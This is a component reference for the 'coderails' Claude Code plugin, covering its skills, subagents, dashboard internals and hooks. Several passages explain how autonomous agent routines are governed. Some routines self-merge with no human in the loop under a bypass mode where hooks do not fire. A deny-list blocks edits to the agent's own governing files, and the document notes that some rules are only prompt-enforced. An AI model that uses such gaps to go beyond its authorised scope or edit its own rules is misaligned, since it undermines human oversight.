# coderails Component Reference

Catalogue of every coderails component (25 skills, plus hooks, commands, scripts): what it does, when it's active, when it's NOT, and dependencies. General dev-workflow skills (planning, TDD, debugging, code review, worktrees) are provided by the required `superpowers@claude-plugins-official` plugin dependency, not bundled here. Ground truth: all entries verified from source files. See README for a lighter overview.

---

## Table of Contents

1. [Skills](#skills)
   - [Coderails-original skills](#coderails-original-skills)
   - [Required plugin dependency: superpowers](#required-plugin-dependency-superpowers)
   - [Wiki skills](#wiki-skills)
   - [Engineering principles skills](#engineering-principles-skills)
2. [Agents](#agents)
3. [Hook Activation Matrix](#hook-activation-matrix)
4. [Commands](#commands)
5. [Scripts and Libraries](#scripts-and-libraries)
6. [Artifact and State Locations](#artifact-and-state-locations)

---

## Skills

Skills are loaded by Claude via the `Skill` tool. They encode a discipline, workflow, or method. There is no automatic activation — Claude must choose to invoke a skill, guided by each skill's `description` frontmatter (which is what the harness surfaces to Claude when deciding whether to fire).

### Coderails-original skills

These skills were written for coderails and are not vendored from elsewhere.

#### `agentic-loop`

**Purpose:** Multi-agent orchestration discipline for sessions where the user has authorised autonomous work across multiple PRs or agents.

**When it triggers:** Any of: "spawn a team", "create a team", "team of agents", "no human gates", "self-merge", "crack on", "without the human", "no per-PR confirmation", "agentic loop", "multi-PR", or 3+ PRs authorised in one instruction. Also triggers for single-PR autonomous merge+deploy+verify chains where the user has explicitly waived per-step confirmation.

**When it does NOT apply:** Single-PR interactive work — that is `/coderails:workflow`. The agentic loop sits _above_ `/workflow` and uses it as a subroutine.

**Key discipline:** Main context is a pure orchestrator. Every code change (even single-file edits) goes to a spawned Sonnet agent. The orchestrator never implements; it delegates to agents, verifies artifacts, and escalates to a spawned team only for ≥3 sequential PRs or dependency chains.

**Dependencies:** Reads and writes `progress.json` (ephemeral loop state — path computed by `hooks/scripts/lib/agentic_loop_path.sh`, never manually). Invokes `superpowers:writing-plans`, `coderails:premortem`, `superpowers:brainstorming`, `coderails:handoff` as sub-skills. Interacts with `loop_state_guard` and `loop_stall_guard` Stop hooks.

---

#### `planning-sequence`

**Purpose:** Three-stage adversarial planning — Pre-Parade (success conditions), Premortem (failure modes), Red Team (adversarial challenge) — run in order on a plan, idea, or decision before committing.

**When it triggers:** "run the planning sequence", "put this through the planning techniques", "stress-test my plan", "Pre-Parade this", or before high-stakes decisions. Also proactively when a user is about to commit without adversarial planning.

**When it does NOT apply:** Forward-looking checklists, code review, or general architecture critique — those do not require backwards reasoning from an assumed failure.

---

#### `premortem`

**Purpose:** Assume a plan, decision, or approach has already failed, then reason backwards to identify failure modes and causes.

**When it triggers:** "premortem this", "steelman the failure", "what could go wrong with this plan", adversarial stress-testing of a specific commitment. Distinguishing signal is backwards reasoning from an assumed bad outcome.

**When it does NOT apply:** Forward-looking checklists ("what should I check before X"), code review, general architecture critique, fact verification.

---

#### `handoff`

**Purpose:** Generate a structured memory file and continuation prompt for carrying work into a new Claude Code session.

**When it triggers:** "handoff", "hand off", "continue in new session", "pick this up later", "save this for next session", "create a handoff", or any intent to preserve session context for future continuation. Also proactively when a session grows long and the user signals they want to wrap up and continue later.

---

#### `improve-prompt`

**Purpose:** Improve a prompt before execution by surfacing ambiguities, filling gaps with reasonable assumptions, and rewriting it for clarity and precision.

**When it triggers:** `/improve-prompt`, "improve this prompt", "what's missing from this prompt", requests to tighten a task description before running it. Also proactively when a prompt is vague, underspecified, or missing success criteria.

---

#### `task-evals`

**Purpose:** Game-resistant success-eval generation. Produces a frozen `evals.json` (scope `pr` or `loop`, verification levels 0-2) with negative controls and grader independence, so success is judged against a fixed target instead of hand-waved after the fact.

**When it triggers:** Invoked at agentic-loop Phase 2.7, at plan completion per `superpowers:writing-plans` (after stress-test, before implementation dispatch), or directly.

**Dependencies:** Consumed by `scripts/post_evals.sh` (`pr` scope, merge gate) and the `loop_state_guard` hook (`loop` scope gate).

---

#### `dashboard`

**Purpose:** Live local web HUD showing sessions, agentic loops, PR gate states, runs, memory activity, and declared one-click triggers.

**Invocation:** `/coderails:dashboard` or `skills/dashboard/scripts/start-dashboard.sh`.

**Run output viewer:** the COMMAND DECK's `OutputViewerPanel`
(`skills/dashboard/app/src/components/OutputViewerPanel.tsx`) shows a
run's output, selected by clicking a row in run history. A still-live run
streams via the `run-output` SSE event (`runId`, `chunk`) added to the
aggregator's event set in `skills/dashboard/app/src/lib/collect/index.ts`
and published by `skills/dashboard/app/src/lib/runOutputBus.ts` — an
in-process pub/sub, not a second SSE endpoint, so it rides the existing
single `/api/events` connection. A finished run's full output is instead
fetched once from `GET /api/run/output`
(`skills/dashboard/app/src/app/api/run/output/route.ts`), which takes
`runId` + `token` query params and returns `{status: "ok", output}`,
`{status: "in-progress"}` (409, if the
run's `endedAt` hasn't landed yet — the client should keep using the live
SSE buffer instead) or `{status: "error", error}`.

**Context Trend and the `context-trend` SSE event:** the CONTEXT TREND panel
(`skills/dashboard/app/src/components/ContextTrendPanel.tsx`) is fed by
`collectContextTrend`
(`skills/dashboard/app/src/lib/collect/contextTrend.ts`), which sweeps every
coderails orchestrator transcript under the projects dir. That sweep is far
slower than the activity slice, so it rides its **own** `context-trend` SSE
event rather than the `activity` frame — otherwise it would gate the System
Vitals KPI tiles, which must paint as soon as their own collect resolves.

Adding a new SSE event means wiring **two** places, and they fail differently
— which is worth knowing before you debug one:

- `src/lib/collect/index.ts` — the `AggregatorEventName` union, the
  `AggregatorEventPayloadMap` entry, and the overloaded `emit`/listener
  signatures. Miss one and it is a **compile error**: the overloads exist so a
  mismatched event/payload pairing cannot type-check.
- `src/hooks/useDashboardState.ts` — the `DashboardEvent` union, a
  `mergeDashboardEvent` case, and the `SSE_EVENT_NAMES` array. That array is
  the **silent** one: the `for (const name of SSE_EVENT_NAMES)` loop is what
  registers each `addEventListener`, so a name missing from it means the
  browser receives the frame, no handler fires, and nothing errors. Only the
  hook-level wiring test catches it — a `mergeDashboardEvent` unit test cannot,
  because it bypasses the registration entirely.

`src/app/api/events/route.ts` needs **no** per-event change: its subscribe
callback forwards any `{event, data}` through an event-name-agnostic
`sseFrame`, with no per-event branch. It does hold
`sharedContextTrendCache`, but that is contextTrend-specific performance
plumbing (stat-only revalidation across connections) — omitting it forfeits
caching, it never drops a frame.

`Snapshot.contextTrend` is **tri-state**, and each state renders differently:
`undefined` means the frame has not arrived yet (the panel shows "loading…"),
`null` means the source was unreadable (the panel shows "unavailable"), and a
summary object is data. Collapsing `undefined` and `null` makes the panel
flash "unavailable" on every page load — the same regression PR #265 removed
for the KPI tiles, where `healthNotYetLoaded` in `RailLeft.tsx` distinguishes
"the collect has not resolved yet" from "the collector tried and could not
populate this tile".

**Per-connection teardown:** `/api/events` releases its aggregator from the
request's `abort` signal as well as `ReadableStream.cancel()`, plus an
`if (request.signal?.aborted)` re-check after setup. `cancel()` alone fires
only when the response *consumer* cancels — a client that simply goes away
does not reliably trigger it, and each abandoned connection then leaked a
recursive `fs.watch` handle per watched dir plus the gates interval. That is
fatal under launchd, which caps the process at `launchctl limit maxfiles`
(256 on stock macOS) rather than the shell's soft limit: once exhausted the
server still accepts TCP but serves nothing.

---

#### `workflow-audit`

**Purpose:** Mines Claude Code session transcripts for tool-use patterns that repeat across sessions, judges which ones are genuine candidates for a new skill, and — only after explicit owner approval — creates each approved skill through the normal `superpowers:writing-skills` TDD process and a full PR gate.

**When it triggers:** "look at our last N sessions and pull out repeated tasks", "what do I do repeatedly that isn't a skill yet", "audit my workflows", "mine my transcripts for skill candidates", "turn my repeated tasks into skills".

**Pipeline:** `scripts/scan_transcripts.sh` (transcripts → per-session tool-use event sequences) pipes into `scripts/cluster_ngrams.sh` (event sequences → recurring n-gram clusters across `--min-sessions` distinct sessions), then a fresh sonnet subagent applies `references/judge-contract.md` to each cluster for a propose/reject verdict. Proposed candidates are charted for the owner; nothing is created without an explicit approval in that interaction — this gate overrides any standing agentic-loop autonomy.

**Queue-mode output (optional):** each `verdict: "propose"` judge output can additionally be piped through `scripts/write_queue_entry.sh` to surface it on the observability dashboard, writing into `~/.claude/coderails-dashboard/approvals/` (routines' own scheduler intents live in the sibling `queue/` directory — see `docs/routines.md`). This is additive to, never a replacement for, the interactive approval gate — a dashboard "Approve" click only flips a queue entry's `status` from `pending` to `approved`.

**Approve-click build runner:** flipping a `workflow-audit:propose-skill` entry to `approved` makes the dashboard's `POST /api/queue` route claim a build directory and spawn a detached, headless `claude -p` build (`skills/dashboard/app/src/lib/build/spawn.ts`, running `skills/dashboard/scripts/run-builder.sh` and prompted via `skills/dashboard/app/src/lib/build/prompt.ts`) that authors the proposed skill through skill-creator and ships it as a coderails PR through the full gate sequence. The builder never merges — its terminal state is an open PR with gates green, surfaced on the dashboard (`skills/dashboard/app/src/lib/collect/builds.ts`); the owner reviews and merges by hand. While the build runs, the panel shows a coarse builder-reported phase (`authoring`/`testing`/`pushing`/`opening_pr`, closed-set-validated in the collector before reaching the client), an elapsed timer, and heartbeat freshness rather than an opaque "building"; once the build's PR leaves the dashboard's open-PR set it shows "PR resolved" instead of a stale "awaiting your merge" (skipped whenever the open-PR set is untrustworthy, so an open PR is never falsely marked resolved). **First skill built end-to-end by this runner:** `verify-merged-pr` (below).

**Privacy invariant:** every artifact in the pipeline — scan output, cluster output, judge input/output, proposal chart, queue entry — carries only tool names, a privacy-whitelisted `head` (first two Bash command tokens, the Skill name, or the Agent subagent_type), counts, and session ids. Never verbatim transcript prose, file contents, or reconstructed intent.

**When it does NOT apply:** it never creates a skill without the interactive approval gate; the mechanical scan+cluster+queue-write pipeline has no skill-creation capability at all, the judge stage only proposes, and the build runner only triggers on an explicit owner Approve click — it is not autonomous.

---

#### `verify-merged-pr`

**Purpose:** Re-derives a "PR #N is merged" claim from the tools before you rely on it — independently confirming the merge **state** (`gh pr view`), the **content** on `origin/main` (fetch + `git merge-base --is-ancestor` + `git grep`), and the **sibling PRs** that landed in the same author/time window. The sibling check is the one agents skip: a reporter names one PR, but a session often lands several.

**When it triggers:** an agent / teammate / CI report / session summary says a PR is merged, shipped, live, or landed; you are about to build on, deploy, or hand off work that depends on the merge being real; a headless builder or loop reports "done — PR merged" with one PR number.

**When it does NOT apply:** you performed the merge yourself this session and watched it complete, or the claim is about an open/draft PR (nothing merged to verify).

**Provenance:** the first skill authored end-to-end by the dashboard Approve→build runner (above) — a `workflow-audit` proposal, Approved on the dashboard, built by a headless `skill-creator` session, and merged by hand.

---

#### `cite-check`

**Purpose:** Re-derives a stated claim from durable sources only — file contents, git output, and fresh command output — and returns a sourced PASS / FAIL / UNSUPPORTED verdict per claim. No recall, no inference.

**How it runs:** `context: fork` with `agent: coderails:source-auditor` and `background: false`. The fork is the point: an audit that runs in the context which produced the claim is self-verification, since the same reasoning that made the error is available to excuse it. The forked auditor sees only the claim text passed via `$ARGUMENTS`.

**When it triggers:** invoked directly as `/coderails:cite-check <claim>`; also named by `agentic-loop` Phase 5, which applies it to the single claim "this bug currently reproduces" before spawning any fix.

**Naming:** called `cite-check` rather than `verify` because `/verify` is a Claude Code **bundled** skill (build and run your app to confirm a change). A project skill of the same name overrides the bundled one, which would silently shadow a built-in with an unrelated meaning.

**Dependencies:** the `coderails:source-auditor` agent.

---

#### `fable-mode`

**Purpose:** Closes the behavioural gap between Claude Opus-class models and Claude Fable 5 by adopting its working habits deliberately: specify-before-start, high autonomy, first-shot correctness, instruction retention over long sessions, and rigorous self-verification.

**When it triggers:** Any non-trivial task — multi-step work, anything involving files or tool calls, analysis, building something, debugging, research, document creation, or long-running work. Applied before starting work, not after, since it changes how the work is done.

**When it does NOT apply:** Trivial single-step responses with no tool use or file involvement.

---

#### `sync-docs`

**Purpose:** Analyzes any codebase and its documentation to identify drift and generate actionable sync reports. Enhanced with Serena for semantic code discovery — an optional `--semantic` flag adds AI-powered undocumented-code discovery on top of the mechanical diff.

**When it triggers:** "sync docs", "check documentation", "documentation drift", "doc audit", explicit `/sync-docs`.

**Invocation modes:** `/sync-docs` (full drift report), `/sync-docs --check` (drift report only, no suggestions), `/sync-docs --suggest-updates` (includes proposed markdown for updates), `/sync-docs --semantic` (Serena-powered deep code discovery), `/sync-docs --compare <section>` (deep-dive analysis of a specific section), `/sync-docs --verbose` (includes detailed file references), `/sync-docs --diagrams-only` (audits only `docs/diagrams/`).

---

#### `memory-consolidation`

**Purpose:** Health-checks and consolidates a project's persistent memory directory (`~/.claude/projects/<slug>/memory/`) — dedupes overlapping memories, flags stale or contradicted ones (without silently deleting `feedback`-type memories), and refreshes the `MEMORY.md` index.

**When it triggers:** "consolidate memory", "clean up memory", "memory consolidation", or when running as a scheduled routine (weekly, via the `routines` section of `~/.claude/coderails-dashboard.json`). Also runs standalone on demand.

**Dependencies:** Writes a durable report artifact to `~/.claude/coderails-dashboard/routines/memory-consolidation/report-{date}.md`, unconditionally — the property a scheduled routine's artifact-gate checks.

---

#### `docs-sync`

**Purpose:** Scheduled nightly pipeline (not for interactive use) that audits this repo's git-tracked documentation for drift against the actual codebase and — only if drift is found — edits, pushes, reviews and self-merges the fix with no human in the loop. Invokes `sync-docs`'s audit as its first step; distinct from that skill, which does the audit alone and is the right entry point for an interactive drift check.

**When it triggers:** Only as the scheduled `sync-docs-nightly` routine (see `docs/routines.md`). It replaced `sync-docs-weekly`, which was read-only (report-only) and had been dead since 2026-07-15 — its `foreignSkillPath` pointed at a path that never existed. An in-repo skill needs no `foreignSkillPath`, so there is no path left to rot.

**No-drift short-circuit:** if the audit finds nothing to fix, the routine appends a `no-drift` line to its run log, then appends a `run=ok` terminal marker, and exits 0 — no branch, no PR. That run log is the routine's `expectedArtifact`, gated by a `last-marker` predicate: the `run=ok` marker is what passes it, so a quiet night still satisfies the gate rather than reading as dead. There is no separate report file on a no-drift night. Most nights take this path.

**Delivery (only when drift is found):** full gate chain, manifest-locked — `task-evals` (pr scope) frozen before the edit, `/coderails:push`, `/pr-review-toolkit:review-pr`, `/coderails:post-review`, `/coderails:post-evals`, `/coderails:merge`. The manifest assertion reads `git diff origin/main...HEAD --name-status` (never `--name-only`, which prints a rename as its destination alone and cannot distinguish a deletion from an edit) and aborts with cleanup unless every path is a git-tracked `.md`, no path is on the self-governance deny-list, no rename's source was out of scope, and no in-scope doc is deleted.

**Self-governance deny-list:** `skills/**/SKILL.md` (including its own), `AGENTS.md`, `CLAUDE.md`, `docs/routines.md`, anything under `.claude/`, `examples/dashboard-config.json`. These are the documents that define what the routine may do; drift against them is reported and escalated to a human, never fixed by the routine. The deny-list is what makes that enforceable rather than merely stated: the first four are themselves `.md`, so the manifest's `.md`-only rule would happily pass them — naming them explicitly is the only thing that stops the routine editing its own contract. The last two are already caught by the non-`.md` rule and are listed anyway, so the deny-list reads as complete on its own rather than depending on a rule stated elsewhere.

**Dependencies:** the second routine in this repo to use a `bypass` button profile — `PreToolUse` hooks do not fire under `claude -p`, so `scripts/merge.sh`'s own artifact gates are the merge rail. Honest boundary: the deny-list and every manifest condition are prompt-enforced, not hook-enforced; they narrow the blast radius (capped at `.md`) rather than mechanically closing it. See `docs/routines.md` for the full contract and security note.

---

#### `loop-retro-promotion`

**Purpose:** Predicate-dormant pipeline (scheduled, not for interactive use) that mines accumulated `retro.json` files and the `standing-orders.md` overlay for repo-agnostic lessons and promotes them into `skills/agentic-loop/learned-failure-modes.md`.

**When it triggers:** Only as the scheduled `loop-retro-promotion-weekly` routine (see `docs/routines.md`) — never for a single loop's retro and never from inside an active agentic-loop session.

**Graduation predicate (evaluated on every run, dormant until met):** at least 10 `retro.json` files under the repo-key dir; at least one `standing-orders.md` entry whose `last_recurred` differs from its `created` date (one full lifecycle); at least one `standing-orders-decayed.md` entry (one clean decay). Every run — met or unmet — appends a line to `promotion-runs.log`; an unmet predicate then appends a `run=ok` terminal marker and stops, with no branch, no PR, no gate chain. The routine's artifact gate is a `last-marker` predicate keyed on that log's final terminal marker (`run=ok` passes; `abort=` or a stranded `delivery=started` fails).

**Delivery (once graduated):** full gate chain, manifest-locked to exactly `skills/agentic-loop/learned-failure-modes.md` — `task-evals` (pr scope) frozen before the edit, `/coderails:push`, `/pr-review-toolkit:review-pr`, `/coderails:post-review`, `/coderails:post-evals`, `/coderails:merge`. Any other file in the diff aborts with cleanup (closes the PR, deletes the branch, logs the abort).

**Dependencies:** Its routine, `loop-retro-promotion-weekly`, is the first routine in this repo to use a non-read-only button profile (`bypass`) — `PreToolUse` hooks do not fire under that execution mode, so `scripts/merge.sh`'s own artifact gates are the only merge rail once the predicate graduates. See `docs/routines.md` for the full routine contract and security note.

---

#### `using-coderails`

**Purpose:** Establishes how to find and use skills at session start. Requires skill invocation before ANY response including clarifying questions.

**When it triggers:** When starting any conversation. Also injected automatically at every session start by the `inject_bootstrap.sh` `SessionStart` hook — Claude receives the full SKILL.md content as context so it can self-bootstrap without being told.

---

### Required plugin dependency: superpowers

These are general development-discipline skills (not coderails-specific
workflow). coderails no longer bundles them — they are provided by the
required `superpowers@claude-plugins-official` plugin (see
[Requirements](../README.md#requirements)/[INSTALLATION.md](../INSTALLATION.md)).
Without that plugin installed, the skill names below resolve to nothing.

| Skill | Purpose |
|---|---|
| `superpowers:brainstorming` | Explores user intent, requirements, and design before implementation. Required before any creative work |
| `superpowers:writing-plans` | Turns a resolved spec into an ordered set of self-contained implementation tasks, each with exact files, interfaces, bite-sized steps, and verify-criteria |
| `superpowers:subagent-driven-development` | Executes implementation plans with independent tasks in the current session using sub-agents |
| `superpowers:dispatching-parallel-agents` | Dispatches 2+ independent tasks to parallel agents to avoid sequential bottlenecks |
| `superpowers:executing-plans` | Executes a written implementation plan in a separate session with review checkpoints |
| `superpowers:using-git-worktrees` | Ensures an isolated workspace exists via native tools or git worktree fallback before feature work |
| `superpowers:requesting-code-review` | Guides the code review request process to ensure work is complete and requirements are met |
| `superpowers:receiving-code-review` | Ensures code review feedback is handled with technical rigor and verification, not performative agreement or blind implementation |
| `superpowers:finishing-a-development-branch` | Presents structured options (merge, PR, cleanup) for integrating completed work when implementation is done and all tests pass |
| `superpowers:systematic-debugging` | Structured debugging approach before proposing fixes for bugs, test failures, or unexpected behaviour |
| `superpowers:test-driven-development` | Red-green-refactor discipline: write the failing test first, watch it fail for the right reason, write minimal code to pass, refactor |
| `superpowers:verification-before-completion` | Runs verification commands and confirms output before making any success claims. Evidence before assertions |
| `superpowers:writing-skills` | Guidance for creating new skills, editing existing skills, or verifying skills work before deployment |

After the self-review gate, a `superpowers:writing-plans` plan goes through
`/coderails:planning-sequence` (Pre-Parade → Premortem → Red Team) before
implementation hands off to `superpowers:subagent-driven-development`/
`superpowers:executing-plans`. Plan storage: `docs/coderails/plans/` is
gitignored — plans are session-local working documents, never tracked in the
repo (owner decision, 2026-07-11). The agentic loop's `plan.md` is a special
case — it lives in the loop-state dir outside the repo alongside
`progress.json`, same treatment.

---

### Wiki skills

These skills manage the LLM Wiki — a persistent, compounding knowledge base maintained by Claude and browsable in Obsidian.

#### `wiki-init`

**Purpose:** Initialize an LLM Wiki for the current project.

**When it triggers:** "wiki init", "create wiki", "knowledge base", "set up obsidian wiki", explicit `/wiki-init`. Also when the user mentions Karpathy's LLM Wiki pattern, AGENTS.md, or wants to organise project knowledge beyond CLAUDE.md.

**When it does NOT apply:** When a wiki already exists and the user wants to query or update it.

---

#### `wiki-ingest`

**Purpose:** Create or update wiki pages to document a merged PR, shipped feature, or engineering decision.

**When it triggers:** "ingest this", "create wiki pages for this PR", "add to wiki", "document this in the wiki", "capture this change", "file this in the wiki". The user always has a concrete artifact to record.

**When it does NOT apply:** General knowledge lookup — use `wiki-query` for that.

---

#### `wiki-lint`

**Purpose:** Audit the quality and structural integrity of the project's LLM Wiki — find contradictions, stale pages, orphaned pages, dead links, missing cross-references, coverage gaps.

**When it triggers:** "wiki-lint", "lint the wiki", "wiki health check", find contradictions or stale content, detect orphaned pages.

**When it does NOT apply:** When the user wants to look up what the wiki says about a topic — use `wiki-query`.

---

#### `wiki-query`

**Purpose:** Search, query, or look up information in the project's LLM Wiki. Can also generate Marp slides or matplotlib charts drawing on wiki knowledge.

**When it triggers:** "search wiki", "query wiki", "ask the wiki", "what does the wiki say", requests to find project-specific answers grounded in wiki content.

**When it does NOT apply:** General coding questions unrelated to wiki content, wiki maintenance tasks (adding, filing, ingesting, linting), wiki initialisation.

---

### Engineering principles skills

These skills enforce engineering principles and language-specific coding standards on code being written or modified.

#### `engineering-principles`

**Purpose:** Enforce engineering principles (YAGNI, KISS, DRY, Fail Fast, SSOT, Law of Demeter) and language-specific coding standards across Python, Go, TypeScript, and Bash. Uses LSP (Serena) for call site analysis and reference counting. Dispatches to the appropriate language sub-skill after detecting the file extension (or, for extensionless files, the shebang line).

**When it triggers:** Proactively after writing or modifying any code file, or explicitly via `/engineering-principles`. Trigger phrases: "enforce standards", "check principles", "apply standards", "code quality".

**When it does NOT apply:** Docs, config, or prose edits with no code to audit.

---

#### `engineering-principles-python`

**Purpose:** Enforce Python idioms and standards on `.py` files — PEP 8 naming, type hints, EAFP over LBYL, context managers, and Pyright strict compliance.

**When it triggers:** Invoked by `engineering-principles` after detecting `.py` files, or directly for Python-only sessions.

---

#### `engineering-principles-go`

**Purpose:** Enforce Go idioms and standards on `.go` files — accept interfaces/return structs, errors-as-values, table-driven tests, and idiomatic naming.

**When it triggers:** Invoked by `engineering-principles` after detecting `.go` files, or directly for Go-only sessions.

---

#### `engineering-principles-ts`

**Purpose:** Enforce TypeScript idioms and standards on `.ts`/`.tsx` files — strict mode, no `any`, discriminated unions, optional chaining, and exhaustive switch checks.

**When it triggers:** Invoked by `engineering-principles` after detecting `.ts`/`.tsx` files, or directly for TypeScript-only sessions.

---

#### `engineering-principles-bash`

**Purpose:** Enforce Bash/shell idioms and standards on `.sh` files — the `set -euo pipefail` safety header and its documented exceptions (sourced libraries, degrade-gracefully hooks), quoting discipline, `[[ ]]` over `[ ]`, avoiding `eval`/word-splitting/unquoted globs, `local`-scoping and the command-substitution-subshell footgun, `namespace::function` decomposition, and shellcheck-clean patterns.

**When it triggers:** Invoked by `engineering-principles` after detecting `.sh` files (or an extensionless file with a `bash`/`sh` shebang), or directly for shell-only sessions.

---

## Agents

Subagent definitions in `agents/`, auto-discovered when the plugin is enabled and
referenced by their namespaced name (`coderails:<name>`). Skills dispatch these
by name instead of pasting a prompt into a `general-purpose` subagent: the model
and tool set travel with the definition, so they survive even if the dispatching
prose is ignored.

How strong that guarantee is varies per agent, and the difference matters:

- **Enforced.** `spec-reviewer` declares `tools: Read, Grep, Glob` and has no
  write capability at all.
- **Partly enforced.** `source-auditor` withholds `Write`/`Edit` via
  `disallowedTools` but keeps `Bash` (it must re-run commands), and `Bash` can
  mutate — so its read-only property is partly discipline.
- **Not enforced.** `pr-review-toolkit:code-reviewer` declares no `tools:` key
  and therefore has full tool access. Naming it buys a pinned model and a
  maintained rubric, not an inability to edit what it reviews.

Do not describe agent dispatch as making a reviewer "physically unable" to edit
unless that specific agent's `tools:`/`disallowedTools` actually says so.

Plugin agents support `name`, `description`, `model`, `effort`, `maxTurns`,
`tools`, `disallowedTools`, `skills`, `memory`, `background` and `isolation`.
They do **not** support `hooks`, `mcpServers` or `permissionMode`.

#### `source-auditor`

**Purpose:** Re-derives one or more stated claims from durable sources only —
file contents, git output, fresh command output — and returns a sourced
PASS / FAIL / UNSUPPORTED verdict per claim.

**Tools:** `Read, Grep, Glob, Bash`, with `disallowedTools: Write, Edit, NotebookEdit`. Not read-only by construction: rule 3 requires re-running commands to re-derive numbers, so `Bash` stays — and `Bash` can mutate. `Write`/`Edit` are withheld; the rest is the agent's stated discipline.
**Model:** `sonnet`.

**Used by:** `/coderails:cite-check`, which forks into it so the audit runs with no
access to the conversation that produced the claim. Verifying a claim inside the
context that generated it is self-verification; the fork is the point.

#### `spec-reviewer`

**Purpose:** Reviews a spec or design document for completeness, internal
consistency, clarity, scope and YAGNI before any implementation planning starts.
Returns Approved or Issues Found.

**Tools:** `Read, Grep, Glob` (read-only). **Model:** `sonnet`.

**Used by:** `superpowers:brainstorming` step 7, replacing an inline self-review.
The author knows what they meant, so ambiguous wording reads as clear to them;
the reviewer only knows what is on the page.

#### `wiki-writer`

**Purpose:** Reads, authors and maintains LLM Wiki pages against the
`AGENTS-wiki-schema.md` contract. Writes files, commits, and opens PRs when the
vault config requires it.

**Tools:** `Read, Grep, Glob, Write, Edit, Bash`. **Model:** `sonnet`.

**Used by:** `wiki-ingest`, `wiki-query`, `wiki-lint`. All three write — a
read-only agent such as `Explore` would break them at their commit step.

#### `loop-worker`

**Purpose:** Implements one scoped unit of work end-to-end: code, tests, commit,
self-review, then an evidence-backed report. Escalates (BLOCKED / NEEDS_CONTEXT)
rather than guessing.

**Tools:** `Read, Grep, Glob, Write, Edit, Bash, Skill`. **Model:** `inherit` —
pass an explicit model at dispatch per `superpowers:subagent-driven-development`'s Model
Selection section; an unconsidered dispatch inherits the session's model, which
is usually the most expensive one.

**Used by:** `superpowers:subagent-driven-development`, `superpowers:dispatching-parallel-agents`.

#### `design-scout`

**Purpose:** Given an unresolved architectural fork (which primitive, which
topology, which of several viable shapes), reads the actual code paths and
originates ONE recommendation with a named flip-condition — never reviews an
existing document. Mandatory primitive-contract read whenever a shared lock,
queue, transaction, or similar is called in nested/recursive/parallel/
re-entrant contexts.

**Tools:** `Read, Grep, Glob, Bash`, with `disallowedTools: Write, Edit, NotebookEdit` (read-only discipline, not a tool guarantee — `Bash` can mutate). **Model:** `inherit` — pass an explicit model at dispatch; `agentic-loop` Phase 2.5 routes `default` or `frontier` per Phase 2.8's table.

**Used by:** `agentic-loop` Phase 2.5 design forks.

#### `disposition-scout`

**Purpose:** Given a Phase 1 plan that retires existing code paths,
recommends clean-break or preserve-compat per retirement unit from the
actual consumers and constraints. Defaults to clean-break; preserve-compat
requires a specific named consumer that cannot migrate in this unit, plus a
removal ticket.

**Tools:** `Read, Grep, Glob, Bash`, with `disallowedTools: Write, Edit, NotebookEdit` (read-only discipline, not a tool guarantee — `Bash` can mutate). **Model:** `inherit` — pass an explicit model at dispatch; `agentic-loop` Phase 2.6 assigns its role inline per Phase 2.8's table (see `model-routing.md`'s "Inline sites elsewhere").

**Used by:** `agentic-loop` Phase 2.6 disposition decisions.

#### `docs-auditor`

**Purpose:** Runs `/sync-docs` to audit the repo's own in-tree docs
(README.md, AGENTS.md, docs/REFERENCE.md, etc.) for drift against just-merged
code, then triages findings — fixes only drift the loop's own PRs introduced,
surfaces pre-existing drift to the human rather than folding it in. Distinct
from `wiki-writer`, which maintains the external wiki vault, not in-tree docs.

**Tools:** `Read, Grep, Glob, Bash, Edit, Skill, Task`, with `disallowedTools: Write, NotebookEdit`. **Model:** `sonnet`.

**Used by:** `agentic-loop` Phase 9.

#### `preflight-scout`

**Purpose:** Runs the pre-planning skill sequence (planning-sequence,
premortem, assumptions, notchecked, wiki-query) plus a retro-intake pass over
`standing-orders.md` and recent `retro.json` files, then returns one
consolidated pre-flight report. Additive-only — never relaxes a gate, skips a
phase, or pre-justifies an eval amendment.

**Tools:** `Read, Grep, Glob, Bash, Skill`, with `disallowedTools: Write, Edit, NotebookEdit`. **Model:** `sonnet`.

**Used by:** `agentic-loop` Phase 2 pre-flight.

#### `proof-author`

**Purpose:** Writes a frozen `proof.json` from ONLY the raw authorising
prompt and any docs it directly references — never the plan, spec, design
decisions, or dispatching conversation. Author/grader independence for
`agentic-loop` Phase 2.7e. Every proof status stays `"pending"`; this agent
never runs or scores a proof.

**Tools:** `Read, Bash, Write`, with `disallowedTools: NotebookEdit`. **Model:** `sonnet`.

**Used by:** `agentic-loop` Phase 2.7e.

#### `deploy-safety-reviewer`

**Purpose:** Reviews a PR or planned change for deploy-safety risk —
rollback risk, blast radius, deploy-time observability coverage,
migration/schema backward-compatibility, and feature-flag applicability —
and returns ONE verdict with a named risk boundary. Distinct from
`pr-review-toolkit:code-reviewer` (correctness/quality), `/security-review`
(auth/injection/secrets), and `pr-review-toolkit:silent-failure-hunter`
(swallowed exceptions, error-handling correctness) — this agent owns whether
a correct, secure, non-silently-failing change is still unsafe to deploy.

**Tools:** `Read, Grep, Glob, Bash`, with `disallowedTools: Write, Edit, NotebookEdit` (read-only discipline, not a tool guarantee, same framing as `source-auditor`/`design-scout`). **Model:** `sonnet`.

**Used by:** any change with a runtime/production surface, before merge — see
"Agents deliberately not shipped" below for why it exists alongside the
`pr-review-toolkit` review agents rather than duplicating them.

#### Agents deliberately not shipped

`pr-review-toolkit@claude-plugins-official` is already a required dependency and
already ships `code-reviewer`, `code-simplifier`, `comment-analyzer`,
`pr-test-analyzer`, `silent-failure-hunter` and `type-design-analyzer`. coderails
does not duplicate them — near-duplicate agents make dispatch ambiguous. Skills
needing code review name `pr-review-toolkit:code-reviewer` directly.

`agents/deploy-safety-reviewer.md` is not a near-duplicate of this list: it
covers deploy-safety concerns — rollback risk, blast radius, migration/schema
safety, feature-flag applicability, and deploy-time observability coverage —
that no `pr-review-toolkit` agent addresses. Its one point of potential
overlap, observability, is deliberately narrowed to the ops-visibility
question (does alerting/dashboard/runbook coverage match the change's blast
radius) and explicitly defers code-level error-handling correctness to
`silent-failure-hunter`.

---

## Hook Activation Matrix

Hooks run automatically on lifecycle events. They can **block** (exit 2 / `permissionDecision: deny`), **warn** (inject advisory context), or run **silently** (inject context with no visible signal). Claude has no choice about whether they run — this is the mechanical enforcement layer.

| Event | Matcher | Script | Mode | WHEN ACTIVE | WHEN INACTIVE |
|---|---|---|---|---|---|
| `SessionStart` | `startup\|clear\|compact` | `inject_bootstrap.sh` | silent | On every session start, clear, or compact that matches the keyword | Never inactive once installed; only skips if `SKILL_FILE` is missing |
